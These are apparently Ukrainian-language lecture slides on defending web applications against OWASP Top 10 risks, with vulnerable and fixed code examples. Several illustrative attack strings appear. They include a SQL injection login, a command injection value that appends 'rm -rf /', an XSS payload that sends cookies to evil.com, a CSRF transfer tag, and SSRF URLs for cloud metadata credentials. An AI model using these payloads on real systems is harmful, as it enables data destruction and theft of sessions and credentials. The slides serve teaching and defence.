A01: Broken Access Control та IDOR

🔓 Broken Access Control

  • Порушення принципу найменших привілеїв
  • Обхід перевірки прав через маніпуляцію URL або параметрами
  • Перегляд або редагування чужих записів
  • Підвищення привілеїв (user → admin)
  • Відсутність перевірки прав на рівні API

🆔 IDOR (Insecure Direct Object Reference)

# Вразливий endpoint:
GET /api/invoices/1042      # твій рахунок
GET /api/invoices/1041      # чужий рахунок ← IDOR!

# Захищений:
GET /api/invoices/1041
→ 403 Forbidden (перевірка власника)

🛡️ Захист від Broken Access Control

  • Перевірка прав доступу на кожному backend-запиті
  • Deny by default — заборонено все, що явно не дозволено
  • RBAC (Role-Based Access Control) або ABAC
  • Непередбачувані ідентифікатори (UUID замість sequential ID)
  • Централізована логіка авторизації
  • Автоматизовані тести для перевірки прав
✅ AWS: IAM + Resource Policies + Cognito Groups для RBAC у хмарних застосунках

A03: Ін'єкції — SQL, Command, LDAP

💉 SQL Injection

# Вразливий запит (Python):
query = "SELECT * FROM users WHERE
  login='" + username + "'"

# Атака:
username = "admin'--"
# Виконується: SELECT * FROM users
#   WHERE login='admin'--'

# Захист — параметризований запит:
cursor.execute(
  "SELECT * FROM users WHERE login=?",
  (username,)
)

⚙️ Command Injection

# Вразливо:
os.system("ping " + user_input)
# Атака: user_input = "8.8.8.8; rm -rf /"

# Захист: subprocess + список аргументів
subprocess.run(["ping", "-c", "1", ip],
               check=True)

🛡️ Захист від ін'єкцій

  • Параметризовані запити — ніколи не конкатенувати рядки
  • ORM — SQLAlchemy, Hibernate, ActiveRecord
  • Валідація вхідних даних — whitelist, а не blacklist
  • Мінімальні права БД — окремий user з SELECT/INSERT
  • WAF — блокування типових payload
  • Escaping — для HTML, JS, SQL, LDAP окремо
ТипКонтекстЗахист
SQL InjectionБД-запитиPrepared statements
LDAP InjectionAD/LDAPLDAP escaping
Command InjectionShellsubprocess list args
XPath InjectionXMLParameterized XPath

A02: Cryptographic Failures

⚠️ Типові помилки криптографії

  • Передача чутливих даних по HTTP (не HTTPS)
  • Зберігання паролів у MD5 або SHA-1
  • Слабкий або відсутній IV/nonce для симетричного шифру
  • Хардкодовані ключі та паролі у вихідному коді
  • Відключена перевірка SSL-сертифікатів (verify=False)
  • Використання застарілих алгоритмів: DES, RC4, ECB
💥 Приклад: LinkedIn (2012) — 6.5 млн паролів у MD5 (без salt) зламані за години після витоку

✅ Правильне хешування паролів

# ❌ Неправильно:
import hashlib
h = hashlib.md5(password.encode()).hexdigest()

# ✅ Правильно (Python):
import bcrypt
hashed = bcrypt.hashpw(
    password.encode(),
    bcrypt.gensalt(rounds=12)
)
# Або argon2:
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
✅ Рекомендовані алгоритми:
Паролі: bcrypt Argon2id scrypt
Шифрування: AES-256-GCM ChaCha20-Poly1305
TLS: 1.2+, краще 1.3

A07: XSS — Cross-Site Scripting

🎭 Типи XSS-атак

Reflected XSS — шкідливий скрипт у запиті, відображається у відповіді
https://site.com/search?q=<script>document.location='evil.com?c='+document.cookie</script>
Stored XSS — скрипт зберігається в БД і виконується у всіх відвідувачів
<script>fetch('/transfer',{method:'POST',body:'to=attacker&amount=1000'})</script>
DOM XSS — маніпуляція DOM на стороні клієнта без взаємодії з сервером
Вразливо: document.innerHTML = location.hash

🛡️ Захист від XSS

  • Output encoding — HTML-entities при виведенні даних у HTML
  • Content Security Policy (CSP) — заборона inline-скриптів
  • HTTPOnly cookie — JS не може читати session cookie
  • X-XSS-Protection: 1; mode=block
  • Використовуйте фреймворк — React, Vue auto-escape
  • Уникати innerHTML, document.write, eval()
  • DOMPurify для sanitization HTML-вмісту
// CSP заголовок:
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self';
  img-src 'self' data:;
  object-src 'none'

CSRF — Cross-Site Request Forgery

⚔️ Як працює CSRF-атака

  1. Жертва автентифікується на bank.com
  2. Браузер зберігає session cookie
  3. Жертва відвідує шкідливий сайт evil.com
  4. На evil.com — прихована форма або img-запит:
<img src="https://bank.com/transfer
  ?to=attacker&amount=10000">
  1. Браузер автоматично додає cookie → переказ виконано!

🛡️ Захист від CSRF

  • CSRF Token — унікальний токен у кожній формі, перевіряється сервером
  • SameSite Cookie:
    • SameSite=Strict — cookie не надсилається з інших сайтів
    • SameSite=Lax — дозволені тільки GET-переходи
  • Double Submit Cookie — порівняння значень у cookie та параметрі
  • Origin / Referer перевірка
  • Для критичних дій — повторна автентифікація
# Django автоматичний захист:
# {% csrf_token %} у кожній формі
# MIDDLEWARE: 'django.middleware.csrf.CsrfViewMiddleware'

# Cookie:
Set-Cookie: session=abc; SameSite=Strict;
            HttpOnly; Secure

A10: SSRF — Server-Side Request Forgery

🌐 Як працює SSRF

Зловмисник змушує сервер виконати запит до внутрішнього або стороннього ресурсу

# Вразливий endpoint:
GET /fetch?url=https://example.com

# Атаки через SSRF:
# 1. AWS IMDS (metadata service):
url=http://169.254.169.254/latest/
    meta-data/iam/security-credentials/

# 2. Внутрішні сервіси:
url=http://internal-admin.corp:8080/admin

# 3. Cloud metadata (GCP):
url=http://metadata.google.internal/
    computeMetadata/v1/instance/
💥 Capital One (2019): SSRF → IMDSv1 → IAM credentials → 100M записів

🛡️ Захист від SSRF

  • Whitelist дозволених URL — лише відомі зовнішні хости
  • Блокування приватних діапазонів: 10.x, 172.16.x, 192.168.x, 169.254.x
  • IMDSv2 — обов'язковий на EC2 (токен-сесія)
  • Відключення непотрібних URL-схем (file://, gopher://)
  • Мережева ізоляція backend-сервера (egress filtering)
  • Перевірка DNS-розв'язування після резолвінгу (DNS rebinding)
✅ AWS захист:
— IMDSv2 (обов'язковий hop limit=1)
— VPC egress rules (Security Groups)
— AWS WAF SSRF-правила (Managed Rules)

Аутентифікація та управління сесіями

⚠️ Типові вразливості (A07)

  • Відсутність брутфорс-захисту (необмежені спроби)
  • Слабкі паролі або дефолтні облікові записи
  • Session ID у URL (витікає через Referer/логи)
  • Session не інвалідується після виходу
  • Занадто довгий термін дії сесії / JWT
  • Відсутність MFA для привілейованих операцій
  • Небезпечний "Забули пароль" (security questions)
💥 Credential Stuffing: автоматичне тестування витоків паролів з інших сервісів

HTTPS та TLS — транспортна безпека

🔒 TLS Handshake (TLS 1.3)

1️⃣ ClientHello — версія, cipher suites, random

2️⃣ ServerHello + Certificate + KeyShare

3️⃣ Клієнт перевіряє сертифікат (CA chain, термін дії)

4️⃣ Генерація спільного секрету (ECDHE)

5️⃣ Шифрований канал встановлено (1-RTT)

📋 Рекомендований TLS конфіг

# Nginx — безпечна конфігурація:
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES256-GCM-SHA384:
            ECDHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;
ssl_session_cache shared:SSL:10m;
ssl_stapling on;

WAF — Web Application Firewall

🛡️ Що таке WAF?

WAF аналізує HTTP/HTTPS трафік та блокує шкідливі запити до того, як вони досягнуть застосунку

Типи WAF:
  • Network-based апаратне рішення перед DMZ
  • Host-based модуль у веб-сервері (mod_security)
  • Cloud-based SaaS (AWS WAF, Cloudflare, Imperva)

📋 Що WAF захищає

  • SQL Injection, XSS, Command Injection
  • OWASP Top 10 типові атаки
  • Bot-трафік та scraping
  • Rate limiting / Brute force
  • Geo-blocking за країнами
  • IP reputation blacklist

⚠️ Обмеження WAF

  • WAF ≠ замінник безпечного коду
  • Бізнес-логіка вразливості — WAF не бачить
  • IDOR — WAF не знає чи ID "чужий"
  • False positives — блокування легітимних запитів
  • Обхід через кодування (URL encoding, unicode)

🏗️ Режими роботи WAF

OAuth 2.0, JWT та OpenID Connect

🔑 OAuth 2.0 — Authorization Framework

Flows:

  • Authorization Code + PKCE — веб та мобільні apps ✅
  • Client Credentials — M2M (мікросервіси, API)
  • Implicit — застарілий, НЕ використовувати
  • Resource Owner Password — небезпечний

🎫 JWT — JSON Web Token

# Структура: header.payload.signature
# Payload (приклад):
{
  "sub": "user-123",
  "iss": "https://auth.example.com",
  "aud": "api.example.com",
  "exp": 1712000000,  # ← обов'язково!
  "roles": ["user"]
}

⚠️ Типові вразливості JWT

  • alg: none — підроблення без підпису
  • RS256→HS256 — підміна алгоритму
  • Відсутність exp — токен діє вічно
  • Слабкий секрет для HS256 — брутфорс
  • Відсутність перевірки aud та iss

🔐 OpenID Connect

Надбудова над OAuth 2.0 для аутентифікації (хто ти?). Додає id_token, userinfo endpoint, стандартні claims.

✅ AWS Cognito: OIDC provider + OAuth 2.0 + JWT + MFA + Social login (Google, Facebook)

Моніторинг та виявлення атак на веб-застосунки

📊 Що логувати обов'язково

  • Всі спроби автентифікації (успіх / невдача) + IP
  • Зміни прав доступу та облікових записів
  • HTTP 400/403/500 помилки (аномальна кількість)
  • Запити до чутливих endpoints (/admin, /api/keys)
  • WAF-спрацьовування та заблоковані запити
  • SQL errors та stack traces у відповідях
  • Аномальний обсяг запитів від одного IP
⚠️ OWASP A09: відсутність логування та моніторингу дозволяє атакам тривати 277 днів у середньому (IBM Cost of Data Breach)

Кращі практики захисту веб-застосунків

✅ Рівень застосунку

  • Валідація всіх вхідних даних (whitelist, server-side)
  • Параметризовані запити для всіх БД-взаємодій
  • Output encoding у контексті виводу (HTML, JS, URL)
  • Мінімальні привілеї для БД-користувачів і сервісних акаунтів
  • Безпечне управління секретами (Secrets Manager, HashiCorp Vault)
  • Dependency scanning (Snyk, Dependabot) — регулярно
  • Security headers на всіх відповідях

✅ Рівень аутентифікації

  • MFA для всіх привілейованих дій
  • bcrypt/Argon2id для паролів
  • Безпечне відновлення паролю (short-lived токени)
  • Перевірка на витоки (Have I Been Pwned API)

✅ Рівень інфраструктури

  • HTTPS скрізь, HSTS preloading
  • WAF перед кожним публічним endpoint
  • Мережева сегментація (DMZ, Private subnets)
  • Regular penetration testing (щоквартально)
  • Patch management — критичні ≤ 24год, важливі ≤ 7 днів

✅ Рівень процесів

  • Threat Modeling на етапі проектування
  • Code Review з фокусом на безпеку
  • SAST/DAST у кожному CI/CD pipeline
  • Incident Response Plan для веб-застосунків
  • Security Champions у кожній команді
📚 Стандарт: OWASP ASVS Level 2 — чек-ліст із 286 вимог для веб-застосунків

Архітектура захищеного веб-застосунку в AWS

🏗️ Ешелонована оборона (Defence in Depth)

🌐 DNS: Route 53 + Shield Advanced

☁️ CDN: CloudFront + TLS 1.3 + OAC

🔥 WAF: AWS WAF (Managed Rules + Custom)

⚖️ Load Balancer: ALB + ACM сертифікат

🔒 Auth: Cognito + MFA + JWT

💻 App: ECS/EKS (non-root, read-only FS)

🗄️ DB: RDS + шифрування + VPC Private Subnet

🔑 Secrets: AWS Secrets Manager

📊 Моніторинг: GuardDuty + Security Hub + CloudTrail

📐 Принципи архітектури

  • Zero Trust — перевіряй завжди, довіряй нікому
  • Least Privilege — мінімальні права для кожного компонента
  • Defence in Depth — кілька незалежних рівнів захисту
  • Fail Secure — при помилці — заборона, не дозвіл
  • Separation of Concerns — розподіл відповідальності
